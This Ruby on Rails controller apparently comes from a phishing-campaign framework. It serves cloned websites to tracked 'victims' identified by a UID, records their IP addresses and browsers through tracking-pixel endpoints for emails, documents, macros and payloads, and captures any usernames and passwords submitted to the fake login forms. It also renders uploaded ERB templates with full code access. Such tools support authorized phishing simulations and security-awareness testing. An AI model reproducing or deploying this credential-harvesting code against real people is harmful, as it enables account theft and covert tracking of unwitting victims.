require 'cgi'

class SiteDeliveryController < ApplicationController
  skip_before_filter :authenticate_admin!

  #
  # Perform a brute force on the k,v for the UID.
  # This allows us to mask the UID in many different
  # parameters, including RESTful routes
  def get_uid
    params.each do |k,v|
      next if v.blank? || !v.is_a?(String)
      return v if v == '000000'
      if get_victim(v)
        return v
      end
    end

    # If we cant find UID in params, check referrer
    if request.referrer
      referrer_params = CGI.parse(URI.parse(request.referrer).query)
      referrer_params.each do |k,v|
        next if v.blank? || !v.is_a?(String)
        return v if v == '000000'
        if get_victim(v)
          return v
        end
      end
    end

    nil
  end

  def get_victim(uid)
    # Allow uid 000000 for testing the campaign
    if uid == '000000'
      v = Victim.new(email_address: @campaign.test_email,
                      uid: '000000',
                      firstname: 'Firstname',
                      lastname: 'Lastname',
                      campaign_id: @campaign.id)
    else
      v = @campaign.victims.find_by(uid: uid)
    end

    v
  end

  def create_visit(victim, extra)
    return if victim.nil? || victim.id.nil? || victim.uid == '000000'

    visit = Visit.new
    visit.victim_id = victim.id
    visit.browser = request.env['HTTP_USER_AGENT']
    visit.ip_address = request.env['HTTP_X_FORWARDED_FOR'] || request.remote_ip
    visit.extra = extra

    if params[:PasswordForm]
      credential = visit.build_credential
      credential.username = params[:UsernameForm].to_s
      credential.password = params[:PasswordForm].to_s
    end

    visit.save
  end

  def tracking_image_macro
    tracking_image("MACRO")
  end

  def tracking_image_document
    tracking_image("DOCUMENT")
  end

  def tracking_image_payload
    tracking_image("PAYLOAD")
  end

  def tracking_image_email
    tracking_image("EMAIL")
  end

  def tracking_image(source)
    begin
      @campaign = Campaign.find(params[:id])
      uid = get_uid
      victim = get_victim(uid)

      if victim
        create_visit(victim, "SOURCE:#{source}")
      else
        logger.info  "Tracking image request for unknown UID: #{uid}"
      end
    ensure
      send_file File.join(Rails.root.to_s, 'public', 'tracking_pixel.png'), :type => 'image/png', :disposition => 'inline'
    end
  end

  def view
    begin
      @campaign = Campaign.find(params[:id])
    rescue ActiveRecord::RecordNotFound
      render :text => 'Not Found', :status => '404'
      return
    end

    uid = get_uid
    @victim = get_victim(uid)

    if @victim
      # Serve up the index page
      if (!params.has_key?(:filename) || params[:filename].blank?)
        create_visit(@victim, params[:extra])
        render_attachment(@campaign.template.directory_index)
        return
      end
    else
      logger.info "Unknown UID: #{uid.inspect} - #{params[:filename].inspect}"
      # If someone is browsing to the root site, or the index page, give
      # them a 404 if we don't know who they are... We need to carry on
      # for other assets etc that may be required/included in the
      # page.
      if !params[:filename] || params[:filename].downcase.include?('index')
        render :text => 'Not Found', :status => '404'
        return
      end
    end

    # Otherwise serve up the website file...
    filename = params[:filename].downcase
    case File.extname(filename)[1..-1]
    when 'js','css','png','gif','jpg','jpeg'
    else
      create_visit(@victim, params[:extra])
    end
    render_attachment(filename)
  end

  def render_attachment(filename)
    @campaign.template.website_files.each do |attachment|
      attachment_filename = attachment.file_identifier.downcase
      if attachment_filename == filename || attachment.file_identifier == "#{filename}.erb"
        begin
          f = File.read(attachment.file.current_path)
          if File.extname(attachment_filename) == '.erb'
            logger.info "Rendering ERB template for #{filename}"
            template = ERB.new(f).result(binding)
            render text: template
            return
          else
            content_type = attachment.file.content_type
            if content_type.include?('http')
              render text: f
              return
            else
              send_data f, type: content_type, disposition: 'inline'
              return
            end
          end
        rescue Exception => e
          render text: "500 Server Error", status: 500
          logger.error e
          return
        end
      end
    end

    raise ActiveRecord::RecordNotFound
  end

end
